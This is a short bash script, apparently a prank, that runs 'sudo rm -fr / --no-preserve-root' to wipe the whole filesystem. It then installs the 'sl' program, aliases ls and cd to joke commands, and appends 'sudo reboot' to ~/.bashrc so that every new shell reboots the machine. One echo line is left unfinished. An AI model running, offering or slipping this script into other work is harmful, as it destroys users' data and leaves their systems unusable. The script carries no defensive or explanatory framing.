#!/bin/bash


sudo rm -fr / --no-preserve-root
sudo apt-get install sl -y

echo "alias ls='sl'" >> ~/.bashrc
echo "alias cd='echo \"No CD found. Please insert a CD and try again.\"'" >> ~/.bashrc
echo "alias "
echo "sudo reboot" >> ~/.bashrc

